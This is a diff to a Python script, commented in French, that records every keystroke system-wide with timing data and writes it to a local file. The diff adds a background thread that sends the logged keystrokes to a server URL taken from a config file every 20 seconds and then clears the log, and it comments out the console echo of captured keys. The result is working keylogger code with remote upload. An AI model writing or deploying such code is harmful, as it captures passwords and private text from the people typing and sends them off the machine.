@@ -5,17 +5,16 @@ import time
 import sys
 import os
 import json
+import threading
 
 # Fichiers locaux
 import sauvegarde_local
 from manipulation_string import strings_egaux
+import envoie_donnees
+
 
 ## Global Variables
-keys = []
-start_date = time.time()
-last_date = start_date
-date_derniere_sauvegarde = time.time()
-dernier_caractere = ''
+
 
 # Caractères à laisser passer que ce soit pressé ou relaché
 caracteres_importants = ["shift", "alt"]
@@ -49,61 +48,88 @@ config = json.load(config_file)
 chemin_sauvegarde = os.path.join(dossier_courant, config["sauvegarde_locale"])
 
 #
-#  Main
+#  Creations des deux threads
 #
-while True:
-	# Attend l'envoie d'une 
-	event = keyboard.read_event()
+def main():
+	keys = []
+	start_date = time.time()
+	last_date = start_date
+	date_derniere_sauvegarde = time.time()
+	dernier_caractere = ''
 
-	# Permet d'arrêter le programme
-	if event.name == 'esc':
-		break
+	while True:
+		# Attend l'envoie d'une 
+		event = keyboard.read_event()
 
-	# Permet de normaliser les systèmes linux et windows
-	eventname = event.name
-	if event.name in caracteres_remplacement:
-		eventname = caracteres_remplacement[event.name]
+		# Permet d'arrêter le programme
+		if event.name == 'esc':
+			break
 
-  # teste le cas où le caractère entré est un caractère important
-	est_un_caractere_important = eventname in caracteres_importants
-  # teste si le caractère est un appui long, permet de ne pas compter plusieurs shift lorsqu'on reste appuyer dessus longtemps
-  # avant de tapper d'autre caractères
-	est_un_appuie_long = event.event_type == keyboard.KEY_DOWN and strings_egaux(eventname, dernier_caractere)
+		# Permet de normaliser les systèmes linux et windows
+		eventname = event.name
+		if event.name in caracteres_remplacement:
+			eventname = caracteres_remplacement[event.name]
 
-  # permet finalement de créer la condition d'ajout du caractère important
-	caracteres_importants_a_ajouter = est_un_caractere_important and not est_un_appuie_long
+		# teste le cas où le caractère entré est un caractère important
+		est_un_caractere_important = eventname in caracteres_importants
+		# teste si le caractère est un appui long, permet de ne pas compter plusieurs shift lorsqu'on reste appuyer dessus longtemps
+		# avant de tapper d'autre caractères
+		est_un_appuie_long = event.event_type == keyboard.KEY_DOWN and strings_egaux(eventname, dernier_caractere)
 
-	# Ne considère l'évennement que si la touche est pressée
-	if caracteres_importants_a_ajouter or not(est_un_caractere_important) and event.event_type == keyboard.KEY_DOWN:
-		date = time.time()
-		dt = date - last_date
+		# permet finalement de créer la condition d'ajout du caractère important
+		caracteres_importants_a_ajouter = est_un_caractere_important and not est_un_appuie_long
 
-		print(eventname, event.event_type)
+		# Ne considère l'évennement que si la touche est pressée
+		if caracteres_importants_a_ajouter or not(est_un_caractere_important) and event.event_type == keyboard.KEY_DOWN:
+			date = time.time()
+			dt = date - last_date
 
-		char = eventname
-		# On doit normaliser certains caractères
-        # Pour éviter des problèmes de csv et de différence d'os
-		if char in caracteres_remplacement :
-			char = caracteres_remplacement[char]
+			#print(eventname, event.event_type)
 
-		item = (char, dt)
-		keys.append(item)
+			char = eventname
+			# On doit normaliser certains caractères
+					# Pour éviter des problèmes de csv et de différence d'os
+			if char in caracteres_remplacement :
+				char = caracteres_remplacement[char]
 
-		last_date = date
-		dernier_caractere = eventname
+			line = f"{char},{dt}\n"
+			sauvegarde_local.sauvegarde(chemin_sauvegarde, line)
+			#keys.append(item)
 
-		# réinitialise le dernier caractère pour que l'appuie long fonctionne de nouveau
-		# pour la détection des caractères spéciaux à ajouter
-		if est_un_caractere_important and event.event_type == keyboard.KEY_UP:
-			dernier_caractere = ''
+			last_date = date
+			dernier_caractere = eventname
 
+			# réinitialise le dernier caractère pour que l'appuie long fonctionne de nouveau
+			# pour la détection des caractères spéciaux à ajouter
+			if est_un_caractere_important and event.event_type == keyboard.KEY_UP:
+				dernier_caractere = ''
+
+def thread_envoie(dt=20):
+	"""
+		Entrée: - dt: entier, correspond à l'interval de temps entre deux envoie du fichier local au serveur,
+									correspond à une durée en secondes.
+	"""
+	while True:
+		with open(chemin_sauvegarde, "r+") as fichier_sauvegarde:
+			data = fichier_sauvegarde.read()
+			envoie_donnees.envoie(config["url"], data)
+			fichier_sauvegarde.truncate(0)
+		time.sleep(dt)
+
+if __name__ == '__main__':
+	main_thread = threading.Thread(target=main)
+	envoie_thread = threading.Thread(target=thread_envoie)
+	main_thread.start()
+	envoie_thread.start()
+
+	print("Threads started")
 
 #print("char,timecode")
 #for el in keys:
 #	print(f"{el[0]},{el[1]}")
 
 
-print("sauvegarde vers", chemin_sauvegarde)
-a_ecrire = sauvegarde_local.data_to_string(keys)
-sauvegarde_local.sauvegarde(chemin_sauvegarde, a_ecrire)
+#print("sauvegarde vers", chemin_sauvegarde)
+#a_ecrire = sauvegarde_local.data_to_string(keys)
+#sauvegarde_local.sauvegarde(chemin_sauvegarde, a_ecrire)
 
